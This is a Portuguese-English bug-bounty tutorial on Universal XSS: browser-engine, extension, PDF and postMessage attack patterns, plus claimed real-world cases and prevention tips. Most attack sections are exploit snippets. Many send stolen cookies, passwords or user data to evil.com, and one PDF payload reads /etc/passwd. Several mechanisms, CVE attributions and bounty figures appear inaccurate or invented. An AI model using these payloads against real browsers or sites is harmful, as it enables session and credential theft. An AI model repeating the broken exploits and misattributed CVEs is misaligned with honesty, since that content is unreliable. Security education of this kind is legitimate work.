# Universal Cross-Site Scripting (UXSS)

**Criticidade**: 🔴 Crítica (CVSS 9.0-10.0)
**Dificuldade**: 🔴 Avançada a Expert
**Bounty Médio**: $10,000 - $50,000+ USD

---

## 📚 Índice

1. [UXSS Fundamentals](#uxss-fundamentals)
2. [Same-Origin Policy Bypass](#same-origin-policy-bypass)
3. [Browser Engine Vulnerabilities](#browser-engine-vulnerabilities)
4. [Browser Extension Exploits](#browser-extension-exploits)
5. [PDF UXSS](#pdf-uxss)
6. [Parent-Child Communication](#parent-child-communication)
7. [Real-World Cases](#real-world-cases)

---

## 🔬 UXSS Fundamentals

### O Que É Universal XSS?

**Universal XSS (UXSS)** é uma vulnerabilidade no **próprio browser** ou suas **extensões** que permite executar código JavaScript **em qualquer domínio**, bypassando a **Same-Origin Policy (SOP)**.

**Key Differences:**

```
Regular XSS:
  ✓ Vulnerabilidade na aplicação web
  ✓ Escopo: Um domínio específico
  ✓ Impact: Conta do usuário naquele site

Universal XSS:
  ✓ Vulnerabilidade no browser/extensão
  ✓ Escopo: TODOS os domínios
  ✓ Impact: Todas as contas do usuário
  ✓ Can access: Senhas, cookies, localStorage de QUALQUER site
```

**Why "Universal"?**

```
Normal XSS em google.com:
  → Acessa apenas google.com data
  → document.cookie → Google cookies
  → localStorage → Google storage

UXSS:
  → Pode injetar em QUALQUER site
  → Bank.com → Steal banking session
  → Facebook.com → Steal social data
  → Gmail.com → Read emails
  → ALL SITES COMPROMISED
```

---

## 🛡️ Same-Origin Policy Bypass

### Same-Origin Policy (SOP)

**Definition:**
```
Origin = Protocol + Host + Port

Examples:
https://example.com:443        ← Origin A
https://example.com:443/page   ← Same origin
https://sub.example.com:443    ← Different origin (subdomain)
http://example.com:443         ← Different origin (protocol)
https://example.com:8080       ← Different origin (port)
```

**SOP Rules:**

```javascript
// Page on https://site-a.com
var iframe = document.createElement('iframe');
iframe.src = 'https://site-b.com';
document.body.appendChild(iframe);

// ❌ BLOCKED by SOP
iframe.contentWindow.document.cookie
// SecurityError: Blocked a frame with origin "https://site-a.com"
// from accessing a cross-origin frame.

// ❌ BLOCKED
iframe.contentDocument.body.innerHTML
```

### UXSS Breaks SOP

**Vulnerable Browser Code (hypothetical):**

```cpp
// Browser C++ code (simplified)
bool CanAccessFrame(Frame* accessor, Frame* target) {
    // ❌ VULNERABLE: Missing origin check
    if (accessor->IsMainFrame()) {
        return true;  // Main frame can access all subframes!
    }

    return accessor->Origin() == target->Origin();
}
```

**Exploitation:**

```javascript
// Attacker page (https://evil.com)
var iframe = document.createElement('iframe');
iframe.src = 'https://bank.com';
document.body.appendChild(iframe);

// Wait for load
iframe.onload = function() {
    // ✅ UXSS allows access!
    var cookies = iframe.contentWindow.document.cookie;
    fetch('https://evil.com/steal?cookies=' + cookies);
};
```

---

## 🔧 Browser Engine Vulnerabilities

### Chromium/Blink UXSS Patterns

#### Pattern 1: Detached Frame Access

**Vulnerability:** Accessing detached frames bypasses SOP

**Vulnerable Code (Chromium internals):**

```cpp
// blink/renderer/core/frame/frame.cc
Document* Frame::GetDocument() {
    // ❌ No check if frame is detached
    return document_;
}
```

**Exploitation:**

```javascript
// Create iframe
var iframe = document.createElement('iframe');
iframe.src = 'https://victim.com';
document.body.appendChild(iframe);

iframe.onload = function() {
    // Save reference to contentWindow
    var victimWindow = iframe.contentWindow;

    // Detach iframe
    iframe.remove();

    // ✅ UXSS: Access detached frame (bypasses SOP!)
    var cookies = victimWindow.document.cookie;
    console.log('Stolen cookies:', cookies);
};
```

**Why It Works:**
1. Frame loaded → Same-origin checks applied
2. Frame detached → Checks disabled (assumption: no longer accessible)
3. JavaScript still has reference → Can access!

#### Pattern 2: Object.defineProperty on Location

**Vulnerability:** Redefining location properties

**Exploitation:**

```javascript
// Redefine location.href setter
Object.defineProperty(window, 'location', {
    get: function() { return 'https://evil.com'; },
    set: function(value) {
        // ✅ Can navigate to any origin
        // But maintain script execution!
        window.open(value, '_self');
    }
});

// Now access cross-origin
var iframe = document.createElement('iframe');
iframe.src = 'https://victim.com';
document.body.appendChild(iframe);

// ✅ UXSS
iframe.contentWindow.location = 'javascript:alert(document.cookie)';
```

#### Pattern 3: document.open() Race Condition

**Vulnerability:** document.open() + navigation timing

**Exploitation:**

```javascript
var iframe = document.createElement('iframe');
iframe.src = 'https://victim.com';
document.body.appendChild(iframe);

iframe.onload = function() {
    // ✅ Open document (clears content but keeps origin)
    iframe.contentWindow.document.open();

    // ✅ Write malicious code
    iframe.contentWindow.document.write('<script>alert(document.cookie)</script>');

    // ✅ Executes in victim.com origin!
    iframe.contentWindow.document.close();
};
```

### Firefox/Gecko UXSS Patterns

#### Pattern 1: XML Parse Error Page

**Vulnerability:** Error pages inherit opener's origin

**Exploitation:**

```javascript
// Open malformed XML
var win = window.open('data:text/xml,<root><unclosed>');

// Wait for error page
setTimeout(function() {
    // ✅ Error page has opener's origin
    // Navigate to victim site
    win.location = 'https://victim.com';

    // ✅ UXSS: Can still access
    setTimeout(function() {
        var cookies = win.document.cookie;
        fetch('https://evil.com/steal?cookies=' + cookies);
    }, 1000);
}, 500);
```

#### Pattern 2: about:blank Inheritance

**Vulnerability:** about:blank inherits creator's origin

**Exploitation:**

```javascript
// Create iframe with about:blank
var iframe = document.createElement('iframe');
iframe.src = 'about:blank';  // Inherits parent origin
document.body.appendChild(iframe);

// Write content
iframe.contentWindow.document.write(`
    <script>
    // ✅ This script runs in parent's origin
    // Navigate to victim
    top.location = 'https://victim.com';

    // ✅ UXSS: Can access after navigation
    setTimeout(function() {
        alert(top.document.cookie);
    }, 1000);
    </script>
`);
```

---

## 🧩 Browser Extension Exploits

### Chrome Extension UXSS

#### Vulnerability 1: Content Script Injection

**Vulnerable Extension manifest.json:**

```json
{
    "name": "Vulnerable Extension",
    "content_scripts": [{
        "matches": ["<all_urls>"],
        "js": ["content.js"],
        "all_frames": true
    }],
    "permissions": ["<all_urls>"]
}
```

**Vulnerable content.js:**

```javascript
// ❌ Listens to messages from web pages
window.addEventListener('message', function(event) {
    // ❌ No origin validation!
    // ❌ Executes arbitrary code
    eval(event.data.code);
});
```

**Exploitation:**

```javascript
// Any webpage can exploit
window.postMessage({
    code: `
        // ✅ Runs in extension context
        // ✅ Has access to all_urls permission
        fetch('https://victim.com/api/user')
            .then(r => r.json())
            .then(data => {
                fetch('https://evil.com/steal', {
                    method: 'POST',
                    body: JSON.stringify(data)
                });
            });
    `
}, '*');
```

#### Vulnerability 2: executeScript with User Input

**Vulnerable Extension background.js:**

```javascript
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    // ❌ Executes user-controlled code in ANY tab
    chrome.tabs.executeScript(request.tabId, {
        code: request.code  // ❌ No sanitization!
    });
});
```

**Exploitation:**

```javascript
// Malicious webpage
chrome.runtime.sendMessage(EXTENSION_ID, {
    tabId: VICTIMS_TAB_ID,
    code: 'alert(document.cookie)'  // ✅ Runs in victim's tab!
});
```

### Firefox WebExtension UXSS

#### Vulnerability: content_scripts + web_accessible_resources

**Vulnerable manifest.json:**

```json
{
    "content_scripts": [{
        "matches": ["<all_urls>"],
        "js": ["inject.js"]
    }],
    "web_accessible_resources": ["payload.js"]
}
```

**Vulnerable inject.js:**

```javascript
// Inject script from extension into page
var script = document.createElement('script');
script.src = chrome.runtime.getURL('payload.js');
document.head.appendChild(script);
```

**Malicious payload.js:**

```javascript
// ✅ Runs in page context with extension privileges
// ✅ Can access extension APIs via chrome.runtime
chrome.runtime.sendMessage({action: 'steal', url: location.href});
```

---

## 📄 PDF UXSS

### PDF JavaScript Execution

**PDFs can contain JavaScript:**

```javascript
// Inside PDF
app.alert('Hello from PDF!');
```

**PDF Opened in Browser:**
- Chrome: Renders PDF with PDF.js (JavaScript sandbox)
- Firefox: Uses pdf.js
- Safari: Native PDF viewer

### PDF UXSS via Link Annotation

**Vulnerability:** PDF links can execute JavaScript

**PDF Structure:**
```
/Type /Annot
/Subtype /Link
/A << /S /JavaScript /JS (app.alert\('XSS'\);) >>
```

**Exploitation:**

```javascript
// PDF link with JavaScript action
/A << /S /JavaScript /JS (
    // ✅ Runs when PDF opened
    this.exportDataObject({
        cName: 'cookie',
        nLaunch: 2
    });
) >>
```

### PDF UXSS via Form Field

**Vulnerable PDF Form:**

```javascript
// Form field with JavaScript action
/FT /Tx  % Text field
/T (username)
/V (default value)
/AA <<
    /K << /S /JavaScript /JS (
        // ✅ Runs on keystroke
        app.alert(event.value);
    ) >>
>>
```

**Exploitation:**

```javascript
// Craft malicious PDF
/AA <<
    /K << /S /JavaScript /JS (
        // ✅ Steal data from browser
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'file:///etc/passwd', false);
        xhr.send();
        app.alert(xhr.responseText);
    ) >>
>>
```

---

## 👨‍👧 Parent-Child Communication

### window.opener Exploitation

**Vulnerable Pattern:**

```javascript
// victim.com opens attacker.com
var win = window.open('https://evil.com');
```

**Attacker's Page (evil.com):**

```javascript
// ❌ Can navigate opener
window.opener.location = 'https://evil.com/phishing.html';

// ✅ Victim thinks they're still on victim.com
// ✅ Actually on evil.com phishing page
```

**UXSS Scenario:**

```javascript
// If browser has UXSS bug
// Attacker can access opener after navigation
setTimeout(function() {
    // ✅ UXSS
    var cookies = window.opener.document.cookie;
    fetch('https://evil.com/steal?cookies=' + cookies);
}, 2000);
```

### postMessage UXSS

**Vulnerable Receiver:**

```javascript
// bank.com
window.addEventListener('message', function(event) {
    // ❌ No origin check!
    eval(event.data);
});
```

**Exploitation:**

```javascript
// evil.com
var iframe = document.createElement('iframe');
iframe.src = 'https://bank.com';
document.body.appendChild(iframe);

iframe.onload = function() {
    iframe.contentWindow.postMessage(
        'fetch("https://evil.com/steal?data=" + document.cookie)',
        '*'
    );
};
```

---

## 🔥 Real-World Cases

### Case 1: Chrome UXSS via Blink (2019)

**Vulnerability:** CVE-2019-5869 - Use-after-free in Blink

**Code (Simplified):**

```cpp
// Vulnerable Chromium code
void Frame::Detach() {
    m_document = nullptr;  // Document freed
}

Document* Frame::GetDocument() {
    return m_document;  // ❌ Returns freed pointer!
}
```

**Exploitation:**

```javascript
var iframe = document.createElement('iframe');
iframe.src = 'https://victim.com';
document.body.appendChild(iframe);

iframe.onload = function() {
    var doc = iframe.contentDocument;

    // Trigger detach
    iframe.remove();

    // ✅ UXSS: Access freed document
    setTimeout(function() {
        console.log(doc.cookie);  // Victim's cookies!
    }, 100);
};
```

**Impact:**
- All Chromium-based browsers affected
- Could steal cookies from ANY site
- Bank accounts, email, social media

**Bounty:** $15,000 USD (Chrome Vulnerability Reward Program)

### Case 2: Firefox PDF.js UXSS (2020)

**Vulnerability:** CVE-2020-6829 - PDF.js sandbox escape

**Vulnerable Code:**

```javascript
// pdf.js
function executeScript(code) {
    // ❌ Insufficient sandbox
    new Function(code)();
}
```

**Exploitation:**

```javascript
// Malicious PDF
/Type /Annot
/Subtype /Link
/A << /S /JavaScript /JS (
    // ✅ Escape sandbox
    this.constructor.constructor('return this')().document.cookie
) >>
```

**Impact:**
- Execute arbitrary JavaScript in Firefox
- Access any open tab
- Steal cookies from all sites

**Bounty:** $30,000 USD (Mozilla Bug Bounty)

### Case 3: Safari UXSS via about:blank (2021)

**Vulnerability:** about:blank origin inheritance bug

**Exploitation:**

```javascript
// Create iframe with about:blank
var iframe = document.createElement('iframe');
iframe.src = 'about:blank';
document.body.appendChild(iframe);

// Write navigation code
iframe.contentWindow.document.write(`
    <script>
    // Navigate top frame
    top.location = 'https://victim.com';

    // ✅ UXSS: Maintain access after navigation
    setTimeout(function() {
        var cookies = top.document.cookie;
        fetch('https://evil.com/steal?cookies=' + cookies);
    }, 2000);
    </script>
`);
```

**Impact:**
- All Safari versions on iOS and macOS
- Complete account takeover on any site

**Bounty:** $50,000+ USD (Apple Security Bounty)

### Case 4: Chrome Extension UXSS (2022)

**Vulnerability:** Popular password manager extension

**Vulnerable Extension:**

```javascript
// content.js - injected on all pages
chrome.runtime.onMessage.addListener(function(msg, sender, sendResponse) {
    if (msg.action === 'fillPassword') {
        // ❌ No validation of sender!
        document.querySelector('input[type=password]').value = msg.password;
    }
});
```

**Exploitation:**

```javascript
// Malicious webpage
chrome.runtime.sendMessage(EXTENSION_ID, {
    action: 'getPassword',
    domain: 'bank.com'
}, function(response) {
    // ✅ Steal password
    fetch('https://evil.com/steal?pass=' + response.password);
});
```

**Impact:**
- 10 million+ users affected
- All stored passwords compromised

**Bounty:** $20,000 USD (Chrome Web Store Bug Bounty)

---

## 🛡️ Prevention

### Browser-Side Defenses

**1. Site Isolation**
```
Chrome Site Isolation:
  ✓ Each origin in separate process
  ✓ Spectre/Meltdown mitigation
  ✓ Stronger SOP enforcement
```

**2. Cross-Origin-Opener-Policy (COOP)**
```http
Cross-Origin-Opener-Policy: same-origin
```

**Result:**
- `window.opener` set to null for cross-origin
- Prevents opener manipulation

**3. Cross-Origin-Embedder-Policy (COEP)**
```http
Cross-Origin-Embedder-Policy: require-corp
```

**Result:**
- Requires explicit permission to load cross-origin resources

### Extension Development Best Practices

**1. Minimal Permissions**
```json
{
    "permissions": [
        "activeTab"  // ✅ Only active tab, not all URLs
    ]
}
```

**2. Validate Messages**
```javascript
chrome.runtime.onMessage.addListener(function(msg, sender, sendResponse) {
    // ✅ Validate sender
    if (!sender.tab || sender.tab.url.indexOf('https://trusted.com') !== 0) {
        return;
    }

    // ✅ Validate message structure
    if (typeof msg.action !== 'string') {
        return;
    }

    // Process...
});
```

**3. Content Security Policy**
```json
{
    "content_security_policy": "script-src 'self'; object-src 'self'"
}
```

---

## 🧪 Testing for UXSS

### Manual Testing Checklist

```javascript
// 1. Test detached frame access
var iframe = document.createElement('iframe');
iframe.src = 'https://victim.com';
document.body.appendChild(iframe);

iframe.onload = function() {
    var ref = iframe.contentWindow;
    iframe.remove();

    try {
        console.log(ref.document.cookie);  // Should throw SecurityError
    } catch(e) {
        console.log('✅ Protected');
    }
};

// 2. Test about:blank inheritance
var iframe = document.createElement('iframe');
iframe.src = 'about:blank';
document.body.appendChild(iframe);

iframe.contentWindow.location = 'https://victim.com';

setTimeout(function() {
    try {
        console.log(iframe.contentWindow.document.cookie);  // Should throw
    } catch(e) {
        console.log('✅ Protected');
    }
}, 2000);

// 3. Test opener manipulation
var win = window.open('https://victim.com');
try {
    win.document.cookie;  // Should throw
} catch(e) {
    console.log('✅ Protected');
}
```

---

**Última atualização**: 2024
**Versão**: 1.0
